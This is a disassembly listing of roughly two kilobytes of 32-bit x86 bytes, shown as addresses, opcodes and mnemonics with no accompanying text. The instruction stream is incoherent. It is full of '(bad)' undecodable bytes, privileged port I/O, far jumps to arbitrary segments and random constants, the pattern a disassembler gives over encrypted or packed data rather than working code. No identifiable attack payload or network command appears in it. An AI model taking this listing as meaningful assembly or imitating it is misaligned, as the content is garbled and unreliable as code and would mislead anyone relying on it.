  4179f2:	mov    ebx,0xe3ccffe3
  4179f7:	fidivr DWORD PTR [ecx-0x1a2b24fe]
  4179fd:	fiadd  WORD PTR ds:0xeaeee2cd
  417a03:	shr    edx,0xb1
  417a06:	jecxz  0x4179b4
  417a08:	repz fxam 
  417a0b:	retf   0xd4c4
  417a0e:	sar    BYTE PTR [edx-0x4164124],1
  417a14:	idiv   esi
  417a16:	(bad)  
  417a17:	int3   
  417a18:	loopne 0x417a16
  417a1a:	(bad)  
  417a1b:	call   0x146621a
  417a20:	lds    ecx,FWORD PTR [edx+ebp*4]
  417a23:	(bad)
  417a26:	out    0xd3,al
  417a28:	rcl    al,0xaf
  417a2b:	mov    dl,0xd7
  417a2d:	(bad)  
  417a2f:	mov    dl,0x2
  417a31:	out    dx,eax
  417a32:	icebp  
  417a33:	in     al,dx
  417a34:	cmc    
  417a35:	out    dx,al
  417a36:	int    0xba
  417a38:	stc    
  417a39:	add    eax,0xfdf4fdf4
  417a3e:	ffree  st(4)
  417a40:	or     al,0xfe
  417a42:	leave  
  417a43:	jmp    0xd4f3:0xd6d2ddc2
  417a4a:	shl    BYTE PTR [edi-0x1732100e],1
  417a50:	fild   DWORD PTR [edx]
  417a52:	iret   
  417a53:	add    bh,ah
  417a55:	in     eax,dx
  417a56:	shl    bl,cl
  417a58:	repz add eax,0xebf8dcfe
  417a5e:	(bad)  
  417a5f:	or     ebx,edi
  417a61:	fisubr WORD PTR [eax-0x123d152e]
  417a67:	shl    BYTE PTR [edx-0x2b071b54],1
  417a6d:	rcr    ecx,1
  417a6f:	stc    
  417a70:	fild   WORD PTR [ecx]
  417a72:	sar    dh,cl
  417a74:	mov    ebp,0xc1dde0da
  417a79:	or     esi,edi
  417a7b:	add    eax,0xee3c8c8
  417a80:	lds    edx,FWORD PTR [edx]
  417a82:	ret    
  417a83:	ret    0xf3cf
  417a86:	lds    esi,FWORD PTR [ebx-0x25311e14]
  417a8c:	retf   
  417a8d:	retf   
  417a8e:	int    0xb5
  417a90:	clc    
  417a91:	lock repz fild DWORD PTR [edx]
  417a95:	aad    0xdd
  417a97:	add    bl,bl
  417a99:	loopne 0x417a78
  417a9b:	shl    ecx,0xdf
  417a9e:	push   cs
  417a9f:	stc    
  417aa0:	(bad)  [edi]
  417aa2:	stos   DWORD PTR es:[edi],eax
  417aa3:	out    dx,eax
  417aa4:	icebp  
  417aa5:	out    dx,al
  417aa6:	lods   eax,DWORD PTR ds:[esi]
  417aa7:	stos   BYTE PTR es:[edi],al
  417aa8:	out    0xdb,eax
  417aaa:	ftst   
  417aac:	fsubp  st(3),st
  417aae:	mov    edi,0xe0d3f9d0
  417ab3:	sar    DWORD PTR [eax-0x2d1d3922],cl
  417ab9:	repnz (bad) 
  417abc:	faddp  st(7),st
  417abe:	enter  0x9ef,0xc8
  417ac2:	mov    dl,0xd8
  417ac4:	shl    BYTE PTR [edx-0x29113c29],0xb0
  417acb:	retf   
  417acc:	out    0xcc,al
  417ace:	(bad)  
  417ad0:	lock shr bh,cl
  417ad3:	rol    DWORD PTR [esi],cl
  417ad5:	fcom   st(0)
  417ad7:	(bad)  
  417ad8:	std    
  417ad9:	fxam   
  417adb:	add    eax,0xd03cfe5
  417ae0:	or     eax,0xd1e2f00b
  417ae5:	rcl    dl,0xeb
  417ae8:	rcl    cl,0xd3
  417aeb:	mul    esp
  417aed:	lock shl BYTE PTR [esi+esi*8-0x10124328],cl
  417af5:	aam    0xf6
  417af7:	mov    esi,0xd508ddd2
  417afc:	enter  0xf4d4,0xe3
  417b00:	repz (bad) 
  417b02:	in     eax,dx
  417b03:	mov    bl,0xcb
  417b05:	leave  
  417b06:	call   0xd02e3101
  417b0b:	(bad)  
  417b0d:	hlt    
  417b0e:	mov    esi,0xff02f6fb
  417b13:	(bad)  
  417b14:	xlat   BYTE PTR ds:[ebx]
  417b15:	ret    
  417b16:	(bad)
  417b19:	fcmovbe st,st(6)
  417b1b:	lds    ecx,FWORD PTR [edx]
  417b1d:	or     al,cl
  417b1f:	(bad)  
  417b20:	fmulp  st(2),st
  417b22:	into   
  417b23:	jmp    0xcac7:0xd4d1a8dd
  417b2a:	scas   eax,DWORD PTR es:[edi]
  417b2b:	fcomip st,st(5)
  417b2d:	leave  
  417b2e:	mov    ch,0xcb
  417b30:	iret   
  417b31:	aad    0xd2
  417b33:	aad    0xd2
  417b35:	add    edi,edx
  417b37:	sti    
  417b38:	mov    ecx,0xddf4d0f4
  417b3d:	add    eax,DWORD PTR [edi]
  417b3f:	in     eax,0xc9
  417b41:	fldcw  WORD PTR [esi-0x3c11323e]
  417b47:	mov    esp,0xfacebbb3
  417b4c:	mov    eax,0xf1d5e9d7
  417b51:	into   
  417b52:	(bad)  
  417b54:	repnz mov ah,0xc1
  417b57:	cmc    
  417b58:	add    eax,0x3e5f403
  417b5d:	(bad)  
  417b5e:	loopne 0x417b63
  417b60:	or     dl,BYTE PTR [ebx]
  417b62:	(bad)  
  417b63:	retf   
  417b64:	shl    dl,cl
  417b66:	int3   
  417b67:	out    dx,eax
  417b68:	mul    ch
  417b6a:	enter  0xf7db,0xf8
  417b6e:	mov    edi,0xd2e2d4e9
  417b73:	ret    
  417b74:	(bad)  
  417b76:	rol    cl,0xfd
  417b79:	rol    bl,cl
  417b7b:	fcmovnu st,st(0)
  417b7d:	jmp    0xc2ef:0xf906e201
  417b84:	int3   
  417b85:	int3   
  417b86:	mov    esp,0xebceb1cd
  417b8b:	div    BYTE PTR [eax-0x2c300e54]
  417b91:	jecxz  0x417b6b
  417b93:	mov    eax,0xfff6f8fe
  417b98:	icebp  
  417b99:	out    0xea,al
  417b9b:	std    
  417b9c:	inc    ebp
  417b9e:	les    ecx,FWORD PTR [ebx]
  417ba0:	clc    
  417ba1:	stc    
  417ba2:	mov    edi,0xd1dcc2ef
  417ba7:	iret   
  417ba8:	mov    bh,0xed
  417baa:	mov    al,0xb4
  417bac:	(bad)  
  417bad:	xlat   BYTE PTR ds:[ebx]
  417bae:	jmp    0x417b8c
  417bb0:	lock fdiv st,st(1)
  417bb3:	fnstcw WORD PTR [esi-0x3e1ffa09]
  417bb9:	mov    esp,0x3d5c90a
  417bbe:	jmp    0xd2198eb6
  417bc3:	lods   al,BYTE PTR ds:[esi]
  417bc4:	int3   
  417bc5:	(bad)  
  417bc6:	(bad)  
  417bc7:	(bad)  [ebp-0x12e081c]
  417bcd:	retf   
  417bce:	fucom  st(3)
  417bd0:	icebp  
  417bd1:	call   0x8337aa7
  417bd6:	(bad)  
  417bd7:	hlt    
  417bd8:	out    0xfc,eax
  417bda:	sar    esp,0xd8
  417bdd:	out    dx,eax
  417bde:	sti    
  417bdf:	add    BYTE PTR [ebx],al
  417be1:	fucomp st(6)
  417be3:	shl    edi,1
  417be5:	out    0xe2,eax
  417be7:	cmc    
  417be8:	out    dx,al
  417be9:	fcomi  st,st(3)
  417beb:	aam    0xef
  417bed:	fistp  QWORD PTR [eax-0x3d410625]
  417bf3:	rcl    ebx,cl
  417bf5:	in     eax,0xcd
  417bf7:	fistp  QWORD PTR [edx+esi*8-0x1237f637]
  417bfe:	add    al,0xcb
  417c00:	or     eax,0xbcdde8f8
  417c05:	repz (bad) 
  417c07:	call   0xdb3628c7
  417c0c:	(bad)  
  417c0e:	lock mov dl,0xcb
  417c11:	into   
  417c12:	fsubrp st(1),st
  417c14:	(bad)  
  417c16:	mov    ebx,0xddfbf3d4
  417c1b:	call   0xcb304622
  417c20:	out    dx,al
  417c21:	or     al,0xe8
  417c23:	mov    cl,0xaf
  417c25:	test   al,0xdd
  417c27:	repnz retf 
  417c29:	loop   0x417c13
  417c2b:	int3   
  417c2c:	fcmovu st,st(5)
  417c2e:	cld    
  417c2f:	fdiv   QWORD PTR [esp+edx*8-0x270a4347]
  417c36:	shl    ah,0xd6
  417c39:	(bad)  
  417c3a:	stc    
  417c3b:	jmp    0x21762e
  417c40:	or     dh,cl
  417c42:	mov    edi,0xc3eba5e9
  417c47:	(bad)  
  417c48:	xlat   BYTE PTR ds:[ebx]
  417c49:	iret   
  417c4a:	not    al
  417c4c:	leave  
  417c4d:	(bad)  
  417c4f:	bnd jmp 0x417c10
  417c52:	mov    esi,0xbffdf3da
  417c57:	add    al,0xa
  417c59:	add    edx,ebp
  417c5b:	ret    0x5
  417c5e:	out    dx,al
  417c5f:	fld    DWORD PTR [edi]
  417c61:	or     eax,0xf6bde5ed
  417c66:	in     al,dx
  417c67:	hlt    
  417c68:	mov    cl,0xba
  417c6a:	(bad)  
  417c6b:	mov    al,0xf2
  417c6d:	shl    ah,1
  417c6f:	mov    ch,0xd0
  417c71:	cld    
  417c72:	sti    
  417c73:	int3   
  417c74:	fst    st(2)
  417c76:	loop   0x417c83
  417c78:	hlt    
  417c79:	xlat   BYTE PTR ds:[ebx]
  417c7a:	(bad)  
  417c7c:	aam    0xe7
  417c7e:	leave  
  417c7f:	push   es
  417c80:	int    0x8
  417c82:	fmul   st(1),st
  417c84:	in     al,0xee
  417c86:	test   edx,0xfbf0f0f0
  417c8c:	hlt    
  417c8d:	mov    ah,0xba
  417c8f:	(bad)  
  417c91:	std    
  417c92:	out    dx,al
  417c93:	shl    ch,0xd4
  417c96:	aad    0xbe
  417c98:	sar    esi,cl
  417c9a:	(bad)  
  417c9c:	loopne 0x417c6c
  417c9e:	cli    
  417c9f:	add    ecx,ebx
  417ca1:	fdivrp st(0),st
  417ca3:	jecxz  0x417c93
  417ca5:	(bad)  
  417ca6:	in     eax,dx
  417ca7:	repnz int3 
  417ca9:	shl    dl,0xfa
  417cac:	push   esp
  417cae:	call   ebp
  417cb0:	out    dx,al
  417cb1:	jmp    0xd91b57b7
  417cb6:	fnstsw ax
  417cb8:	loopne 0x417cb9
  417cba:	clc    
  417cbb:	(bad)  
  417cbc:	cli    
  417cbd:	fld    QWORD PTR ds:0xc8efecce
  417cc3:	jmp    0xb63364b9
  417cc8:	into   
  417cc9:	xlat   BYTE PTR ds:[ebx]
  417cca:	fxam   
  417ccc:	repz push ebx
  417ccf:	jmp    0x425529f
  417cd4:	ret    
  417cd5:	mov    eax,0xf20603dd
  417cda:	(bad)
  417cdd:	out    dx,eax
  417cde:	sti    
  417cdf:	(bad)  
  417ce1:	or     al,bl
  417ce3:	loope  0x417cd5
  417ce5:	iret   
  417ce6:	(bad)  
  417ce8:	ret    0xdbd0
  417ceb:	out    dx,al
  417cec:	fdivrp st(2),st
  417cee:	imul   al
  417cf0:	mov    edi,0xfebacc03
  417cf5:	aad    0xc3
  417cf7:	loopne 0x417cca
  417cf9:	(bad)  
  417cfa:	jecxz  0x417cda
  417cfc:	or     cl,al
  417cfe:	out    0xc2,eax
  417d00:	add    dl,bl
  417d02:	enter  0xc1bd,0xcc
  417d06:	bnd ret 0xebda
  417d0a:	fucomi st,st(6)
  417d0c:	neg    esi
  417d0e:	mov    ch,0xfb
  417d10:	stc    
  417d11:	mov    ah,0xbc
  417d13:	sar    dh,cl
  417d15:	ffree  st(0)
  417d17:	mul    ecx
  417d19:	or     eax,edx
  417d1b:	pop    es
  417d1c:	out    0xf4,eax
  417d1e:	or     ecx,esi
  417d20:	sti    
  417d21:	out    dx,eax
  417d22:	in     al,0xac
  417d24:	mov    edi,0xe4b1f2b6
  417d29:	into   
  417d2a:	(bad)
  417d2d:	jmp    0x417ce9
  417d2f:	icebp  
  417d30:	shr    dl,1
  417d32:	(bad)  
  417d33:	mov    edi,0xe1c6c3dc
  417d38:	mov    ecx,0xe1c9c6fe
  417d3d:	cli    
  417d3e:	fdivp  st(5),st
  417d40:	fcom   DWORD PTR [edx]
  417d42:	sar    BYTE PTR [edi-0x383d572f],1
  417d48:	sar    ebx,0xe9
  417d4b:	mov    dh,0xf7
  417d4d:	in     eax,0xbd
  417d4f:	add    esi,ebx
  417d51:	fmulp  st(4),st
  417d53:	add    BYTE PTR [ecx-0x3c330442],bh
  417d59:	(bad)
  417d5c:	add    cl,dh
  417d5e:	or     eax,esp
  417d60:	cli    
  417d61:	cld    
  417d62:	mov    cl,0xca
  417d64:	test   edi,0xcef6ace7
  417d6a:	aad    0xe4
  417d6c:	out    0xf5,al
  417d6e:	mov    esi,0xdebabdbe
  417d73:	call   0xd9266f5e
  417d78:	ret    
  417d79:	fdivr  st(1),st
  417d7b:	fimul  WORD PTR [esi]
  417d7d:	out    dx,eax
  417d7e:	add    esp,esp
  417d80:	pop    es
  417d81:	or     eax,0xc2f0b8af
  417d86:	int3   
  417d87:	mov    bh,0xd2
  417d89:	shr    edx,cl
  417d8b:	not    cl
  417d8d:	sti    
  417d8e:	in     al,0xcb
  417d90:	clc    
  417d91:	rol    edx,1
  417d93:	not    al
  417d95:	in     al,dx
  417d96:	pop    es
  417d97:	std    
  417d98:	mov    ebp,0xbddfe0c1
  417d9d:	or     dh,bh
  417d9f:	fisttp DWORD PTR [ecx]
  417da1:	cli    
  417da2:	retf   
  417da3:	repz enter 0xccc8,0xd3
  417da8:	fisubr DWORD PTR [eax-0x322f303a]
  417dae:	fcomip st,st(3)
  417db0:	fstp   TBYTE PTR [edi-0x1d2a282e]
  417db6:	aam    0xc2
  417db8:	aad    0xdf
  417dba:	cli    
  417dbb:	retf   0xc8e1
  417dbe:	out    dx,eax
  417dbf:	fild   WORD PTR [esi]
  417dc1:	add    ecx,esi
  417dc3:	out    dx,eax
  417dc4:	shr    BYTE PTR [esi-0x57481c2c],0xb4
  417dcb:	fxch   st(0)
  417dcd:	mov    al,0xd4
  417dcf:	int    0xbc
  417dd1:	in     eax,dx
  417dd2:	(bad)  
  417dd3:	loop   0x417dd4
  417dd5:	in     eax,0xd1
  417dd7:	mov    edx,0xbf106fc
  417ddc:	call   0x10c88ac
  417de1:	repnz into 
  417de3:	out    dx,al
  417de4:	(bad)  
  417de5:	mov    dl,0xcd
  417de7:	bnd ret 
  417de9:	aam    0xc1
  417deb:	out    dx,eax
  417dec:	aad    0xd3
  417dee:	imul   ch
  417df0:	into   
  417df1:	mov    al,0xbc
  417df3:	(bad)  
  417df5:	add    edi,ecx
  417df7:	fnstcw WORD PTR [ebp+0xfc8daf4]
  417dfd:	sti    
  417dfe:	add    esp,ecx
  417e00:	in     eax,dx
  417e01:	add    eax,0xd1c7e3cd
  417e06:	retf   
  417e07:	mov    bh,0xda
  417e09:	jmp    0xf70f34f7
  417e0e:	aad    0xd0
  417e10:	clc    
  417e11:	fidivr DWORD PTR [eax-0x270c0d0b]
  417e17:	add    BYTE PTR ds:0xe60a04f5,al
  417e1d:	(bad)  
  417e1e:	enter  0xecda,0xe7
  417e22:	enter  0xe1c3,0xd1
  417e26:	(bad)  
  417e27:	mov    bl,0xad
  417e29:	mov    cl,0xcf
  417e2b:	retf   
  417e2c:	mov    cl,0xd2
  417e2e:	div    cl
  417e30:	int3   
  417e31:	sti    
  417e32:	sti    
  417e33:	mov    esi,0xe3f7f9ed
  417e38:	std    
  417e39:	jmp    0x417e24
  417e3b:	jmp    edx
  417e3d:	fild   WORD PTR [eax]
  417e3f:	fadd   QWORD PTR [esi]
  417e41:	pop    es
  417e42:	rol    bh,cl
  417e44:	mov    esi,0xceacced1
  417e49:	fcmovb st,st(5)
  417e4b:	sar    DWORD PTR [edx-0x4e490111],1
  417e51:	repz icebp 
  417e53:	int    0xed
  417e55:	loop   0x417e14
  417e57:	fld    st(2)
  417e59:	repnz out 0xc8,eax
  417e5c:	loope  0x417e6b
  417e5e:	push   cs
  417e5f:	fsubr  st,st(4)
  417e61:	jmp    0x417e24
  417e63:	loope  0x417e57
  417e65:	out    dx,al
  417e66:	leave  
  417e67:	lock mov ah,0xa8
  417e6a:	mov    ch,0xff
  417e6c:	shr    edx,1
  417e6e:	mov    ecx,0xfdb9d9f5
  417e73:	mov    esi,0xd4d2dcb8
  417e78:	rcl    ecx,cl
  417e7a:	leave  
  417e7b:	rcr    ebp,0x1
  417e7e:	into   
  417e7f:	loop   0x417e8b
  417e81:	in     al,dx
  417e82:	mov    ecx,0xcad0bed3
  417e87:	out    dx,eax
  417e88:	repnz mov dl,0xc1
  417e8b:	call   0xb8fd737b
  417e90:	cli    
  417e91:	mov    eax,0xb4e6d5f5
  417e96:	repz repz fst st(1)
  417e9a:	idiv   ebx
  417e9c:	(bad)  
  417e9d:	jmp    ebp
  417e9f:	add    eax,0xf1cbe400
  417ea4:	in     eax,dx
  417ea5:	cmc    
  417ea6:	mov    dl,0xc0
  417ea8:	fcmovnbe st,st(7)
  417eaa:	aad    0xda
  417eac:	mov    ah,0xb0
  417eae:	(bad)  
  417eaf:	(bad)  
  417eb0:	mov    ebx,0xe6cdbec8
  417eb5:	mov    esp,0xd2e1f6da
  417eba:	jecxz  0x417eb4
  417ebc:	jmp    0x417e92
  417ebe:	add    eax,0xbfdceff9
  417ec3:	loopne 0x417e96
  417ec5:	lods   al,BYTE PTR ds:[esi]
  417ec6:	call   0xaff24497
  417ecb:	out    dx,eax
  417ecc:	in     eax,0xf6
  417ece:	clc    
  417ecf:	hlt    
  417ed0:	int3   
  417ed1:	sar    BYTE PTR [ebx-0xdfd2cfd],1
  417ed7:	cli    
  417ed8:	out    0xb,eax
  417eda:	not    eax
  417edc:	jmp    0xb2e0:0xdee0e5fa
  417ee3:	repnz rcr esp,cl
  417ee6:	stos   DWORD PTR es:[edi],eax
  417ee7:	retf   
  417ee8:	fcmove st,st(2)
  417eea:	out    0xe4,al
  417eec:	in     al,0xc4
  417eee:	clc    
  417eef:	mov    eax,0xe3f5cefd
  417ef4:	div    dl
  417ef6:	icebp  
  417ef7:	mov    esi,0xf5dbf5d9
  417efc:	add    edi,DWORD PTR [esp+esi*8-0x18171708]
  417f03:	mov    ebp,0xcbcfe7ae
  417f08:	into   
  417f09:	loop   0x417ec4
  417f0b:	stc    
  417f0c:	enter  0xccec,0xf2
  417f10:	mov    edx,0xf7ccfbc9
  417f15:	mov    ah,0xbc
  417f17:	fcmovbe st,st(3)
  417f19:	fdiv   st(4),st
  417f1b:	(bad)
  417f1e:	in     eax,dx
  417f1f:	int3   
  417f20:	add    eax,0xcec6edee
  417f25:	shl    bl,cl
  417f27:	int    0xb4
  417f29:	lock out dx,al
  417f2b:	mov    al,0xf6
  417f2d:	mov    ah,0xca
  417f2f:	mov    dh,0xec
  417f31:	cli    
  417f32:	mov    edx,0xec01f0ee
  417f37:	mov    esp,0xfcd7dabd
  417f3c:	add    ah,al
  417f3e:	jmp    0xab424c24
  417f43:	jmp    0xefa9:0xfbd1e4c2
  417f4a:	out    dx,eax
  417f4b:	in     eax,dx
  417f4c:	in     al,0xb5
  417f4e:	fistp  QWORD PTR [edi+0x1f9bcb4]
  417f54:	(bad)  
  417f55:	repz in al,0x3
  417f58:	cli    
  417f59:	or     bl,al
  417f5b:	or     esp,esp
  417f5d:	retf   
  417f5e:	aad    0xde
  417f60:	repnz in eax,0xac
  417f63:	retf   0xace8
  417f66:	mov    ch,0xe2
  417f68:	mov    al,0xf4
  417f6a:	rcl    ecx,cl
  417f6c:	(bad)  
  417f6d:	fcomp  st(6)
  417f6f:	out    dx,eax
  417f70:	rcr    bl,cl
  417f72:	(bad)  
  417f73:	sti    
  417f74:	aam    0x5
  417f76:	add    bl,ch
  417f78:	test   DWORD PTR [ecx+eax*8],0xe0de0ef9
  417f7f:	(bad)  
  417f81:	adc    esp,eax
  417f83:	lods   eax,DWORD PTR ds:[esi]
  417f84:	(bad)  
  417f85:	in     eax,dx
  417f86:	mov    dh,0xb7
  417f88:	out    dx,eax
  417f89:	mov    dh,0xf0
  417f8b:	(bad)  
  417f8c:	cli    
  417f8d:	mov    al,0xe5
  417f8f:	mov    edx,0xd4d0c8b4
  417f94:	fld    QWORD PTR ds:0xe4f2c7e7
  417f9a:	jmp    0xc9eb:0xd8edcaf6
  417fa1:	stc    
  417fa2:	(bad)  
  417fa3:	int3   
  417fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fa5:	mul    al
  417fa7:	out    dx,al
  417fa8:	test   eax,0xf8f7c4f6
  417fad:	mov    ch,0xcd
  417faf:	fcom   st(7)
  417fb1:	idiv   BYTE PTR [edx-0x2203ff2a]
  417fb7:	repz hlt 
  417fb9:	rol    BYTE PTR [esi],0x6
  417fbc:	std    
  417fbd:	fstp   st(7)
  417fbf:	loopne 0x417f89
  417fc1:	in     eax,dx
  417fc2:	lods   al,BYTE PTR ds:[esi]
  417fc3:	test   eax,0xf3d3bcdd
  417fc8:	iret   
  417fc9:	(bad)  
  417fca:	hlt    
  417fcb:	repnz (bad) 
  417fcd:	clc    
  417fce:	mov    dh,0xf5
  417fd0:	int    0xd5
  417fd2:	jecxz  0x417fc4
  417fd4:	add    bl,bh
  417fd6:	xlat   BYTE PTR ds:[ebx]
  417fd7:	push   es
  417fd8:	les    edi,FWORD PTR [eax-0x922160b]
  417fde:	or     eax,0xd8e7f2c4
  417fe3:	(bad)  
  417fe4:	(bad)  
  417fe5:	enter  0xe9b7,0xc2
  417fe9:	fcmovnb st,st(1)
  417feb:	hlt    
  417fec:	xlat   BYTE PTR ds:[ebx]
  417fed:	mov    ebx,0xeadcf8d8
  417ff2:	shr    ah,1
  417ff4:	out    0xd3,al
  417ff6:	not    bh
  417ff8:	cmc    
  417ff9:	(bad)  
  417ffa:	test   DWORD PTR ds:0x1cde703,0xdeb1e2e6
  418004:	(bad)
  418007:	xlat   BYTE PTR ds:[ebx]
  418008:	leave  
  418009:	in     al,dx
  41800a:	not    ah
  41800c:	shl    ch,1
  41800e:	mov    bh,0xdf
  418010:	lock (bad) 
  418013:	sar    ch,cl
  418015:	in     al,dx
  418016:	aam    0xe4
  418018:	mov    ebp,0xc1fb0004
  41801d:	out    0xf4,al
  41801f:	fmul   st,st(2)
  418021:	fadd   st,st(6)
  418023:	loope  0x41800d
  418025:	in     eax,0xf2
  418027:	call   0xce3c7c02
  41802c:	mov    ecx,0xe2edfcb7
  418031:	mov    al,0xe3
  418033:	ror    ebp,cl
  418035:	(bad)  
  418036:	test   dl,0xf8
  418039:	mov    esp,0xe4fac9d0
  41803e:	or     edx,esp
  418040:	loop   0x418046
  418042:	loope  0x41800a
  418044:	ret    0xb2b7
  418047:	out    0xf4,eax
  418049:	xlat   BYTE PTR ds:[ebx]
  41804a:	clc    
  41804b:	leave  
  41804c:	iret   
  41804d:	ror    esp,cl
  41804f:	mov    dh,0xbb
  418051:	fnstsw WORD PTR [ebx-0x183d1e11]
  418057:	out    0xd3,al
  418059:	add    eax,0xfa00ffe6
  41805e:	retf   0xefe3
  418061:	(bad)  
  418062:	fdiv   st,st(1)
  418064:	lds    esi,FWORD PTR [ecx-0x4a3e180c]
  41806a:	enter  0xcde7,0xee
  41806e:	jmp    0x1366a6b
  418073:	out    dx,al
  418074:	icebp  
  418075:	in     al,dx
  418076:	sti    
  418077:	in     eax,0xde
  418079:	push   es
  41807a:	clc    
  41807b:	xlat   BYTE PTR ds:[ebx]
  41807c:	fmul   QWORD PTR [esi]
  41807e:	clc    
  41807f:	or     ah,cl
  418081:	in     eax,dx
  418082:	repz out dx,al
  418084:	iret   
  418085:	repnz mov cl,0xb0
  418088:	mov    bh,0xb6
  41808a:	cmc    
  41808b:	retf   
  41808c:	retf   0xfcba
  41808f:	out    dx,al
  418090:	std    
  418091:	mov    ah,0xba
  418093:	ret    0xc7d8
  418096:	shl    esi,1
  418098:	loope  0x41806c
  41809a:	mov    edi,0xcfc4da01
  41809f:	cld    
  4180a0:	or     ch,ah
  4180a2:	shl    DWORD PTR [ecx-0x3b3e4c35],0xf7
  4180a9:	repz (bad) 
  4180ab:	call   0xe8fc4069
  4180b0:	icebp  
  4180b1:	ror    cl,cl
  4180b3:	mov    esp,0x3bdbeef
  4180b8:	jmp    0x418098
  4180ba:	or     al,cl
  4180bc:	in     eax,0x2
  4180be:	fsub   st(0),st
  4180c0:	push   es
  4180c1:	out    dx,eax
  4180c2:	mov    cl,0xf1
  4180c4:	mov    esp,0xadecaed5
  4180c9:	mov    edx,0xfdf8dad5
  4180ce:	fidivr DWORD PTR [edi-0x1308fc2d]
  4180d4:	std    
  4180d5:	mov    edi,0xe6dcdbc1
  4180da:	or     dl,al
  4180dc:	mul    edx
  4180de:	in     al,dx
  4180df:	int3   
  4180e0:	fld    QWORD PTR [ebx]
  4180e2:	mov    ecx,0xddb0e1d2
  4180e7:	ret    
  4180e8:	in     al,dx
  4180e9:	enter  0xd4bb,0xf1
  4180ed:	(bad)  
  4180ef:	cli    
  4180f0:	iret   
  4180f1:	mov    esi,0xfdf6e301
  4180f6:	loopne 0x4180e8
  4180f8:	lock cmc 
  4180fa:	add    dh,ch
  4180fc:	(bad)  
  4180fd:	out    0xea,eax
  4180ff:	leave  
  418100:	repnz in al,dx
  418102:	loope  0x4180ea
  418104:	into   
  418105:	icebp  
  418106:	stos   DWORD PTR es:[edi],eax
  418107:	lods   al,BYTE PTR ds:[esi]
  418108:	jmp    0xb5f7:0xe4bab3b2
  41810f:	leave  
  418110:	mov    ebp,0xfaf5fcd8
  418115:	repnz add al,0xd6
  418118:	rol    BYTE PTR [edx],0xe6
  41811b:	add    esp,edi
  41811d:	hlt    
  41811e:	push   cs
  41811f:	retf   0xced8
  418122:	out    dx,eax
  418123:	retf   
  418124:	iret   
  418125:	in     eax,0xf4
  418127:	(bad)  
  418128:	mov    ah,0xb0
  41812a:	shl    ch,1
  41812c:	mov    ah,0xf4
  41812e:	(bad)  
  418130:	lock cld 
  418132:	loop   0x41813b
  418134:	repz aad 0xe6
  418137:	fld    QWORD PTR [ecx]
  418139:	loopne 0x41813d
  41813b:	add    cl,bl
  41813d:	cld    
  41813e:	or     eax,0xdde500f9
  418143:	fnsave [eax-0x282a3352]
  418149:	in     al,dx
  41814a:	leave  
  41814b:	lock (bad) 
  41814d:	fcmovbe st,st(6)
  41814f:	int    0xee
  418151:	mov    ebp,0xdbdfd7c1
  418156:	jmp    esi
  418158:	shr    edx,0xe8
  41815b:	jmp    0xa06:0xf0cfbe8
  418162:	out    0xe0,al
  418164:	out    dx,al
  418165:	faddp  st(7),st
  418167:	jecxz  0x418160
  418169:	shr    bh,cl
  41816b:	retf   
  41816c:	int    0xc8
  41816e:	int    0xdf
  418170:	fcmovbe st,st(3)
  418172:	repz mov edi,0xf9fb07de
  418178:	(bad)  
  41817a:	fidivr WORD PTR [esi-0x3d39f23c]
  418180:	add    eax,0xb2c9eadf
  418185:	shr    esi,cl
  418187:	mov    cl,0xad
  418189:	fidiv  DWORD PTR [ebp-0x4414384e]
  41818f:	mov    dh,0xca
  418191:	shl    bl,1
  418193:	(bad)  
  418195:	aad    0xe0
  418197:	jmp    0x41819a
  418199:	icebp  
  41819a:	sar    dl,1
  41819c:	aam    0xe0
  41819e:	fsubp  st(3),st
  4181a0:	(bad)
  4181a3:	stos   BYTE PTR es:[edi],al
  4181a4:	lock lock call 0xb3f77895
  4181ab:	repz hlt 
  4181ad:	mov    ah,0xf2
  4181af:	cli    
  4181b0:	out    dx,eax
  4181b1:	xlat   BYTE PTR ds:[ebx]
  4181b2:	mov    esi,0xc3c2e0
  4181b7:	mov    edx,0xa07f6e0
  4181bc:	fadd   st(7),st
  4181be:	(bad)  
  4181bf:	out    dx,eax
  4181c0:	jmp    0x4181a9
  4181c2:	in     al,dx
  4181c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c4:	mov    edi,0xcfced3de
  4181c9:	aam    0xc6
  4181cb:	out    dx,eax
  4181cc:	fdivp  st(1),st
  4181ce:	aam    0xb4
  4181d0:	xlat   BYTE PTR ds:[ebx]
  4181d1:	jecxz  0x4181c7
  4181d3:	aam    0xdd
  4181d5:	mul    edi
  4181d7:	in     al,dx
  4181d8:	loopne 0x4181b0
  4181da:	jecxz  0x4181d4
  4181dc:	(bad)  
  4181de:	add    ch,bl
  4181e0:	jmp    0xb2c7:0xc3b3b2fe
  4181e7:	in     al,dx
  4181e8:	mov    al,0xe5
  4181ea:	out    dx,al
  4181eb:	out    0xbf,eax
  4181ed:	int3   
  4181ee:	into   
  4181ef:	mov    ch,0xd9
  4181f1:	(bad)  
  4181f3:	fnstsw WORD PTR [eax-0x3e263c41]
  4181f9:	(bad)  
  4181fa:	lock jmp 0x4181cc
  4181fd:	out    0xc5,eax
  4181ff:	fimul  WORD PTR [ecx]
  418201:	jmp    0xb7223ad7
  418206:	leave  
  418207:	in     al,dx
  418208:	mov    bl,0xc9
  41820a:	icebp  
  41820b:	out    dx,eax
  41820c:	call   0xeff646c7
  418211:	loope  0x4181cb
  418213:	pop    es
  418214:	sti    
  418215:	(bad)  
  418216:	repnz fisttp DWORD PTR [edx]
  418219:	shl    ebx,0xc6
  41821c:	fcmovbe st,st(4)
  41821e:	in     eax,dx
  41821f:	in     al,dx
  418220:	out    dx,al
  418221:	push   cs
  418222:	lods   eax,DWORD PTR ds:[esi]
  418223:	loop   0x4181d5
  418225:	shl    DWORD PTR [ebp-0x4f26384f],cl
  41822b:	int3   
  41822c:	div    cl
  41822e:	in     eax,0xf6
  418230:	mov    edx,0xf8d0fec3
  418235:	add    ch,ah
  418237:	lds    eax,FWORD PTR [edi]
  418239:	or     al,BYTE PTR [edx]
  41823b:	fcmovu st,st(1)
  41823d:	fadd   QWORD PTR ds:0xe6fcfff8
  418243:	idiv   DWORD PTR [edi-0x4f19520e]
  418249:	mov    cl,0xfa
  41824b:	call   0xfef95220
  418250:	mov    ecx,0xf2e8fb03
  418255:	fstp   st(4)
  418257:	ret    
  418258:	hlt    
  418259:	add    eax,0xf5dddf09
  41825e:	aam    0xe4
  418260:	jmp    0x418270
  418262:	shl    dl,1
  418264:	out    0xf7,eax
  418266:	mov    bh,0xaa
  418268:	mov    dh,0xcf
  41826a:	(bad)
  41826d:	int3   
  41826e:	out    dx,eax
  41826f:	(bad)  
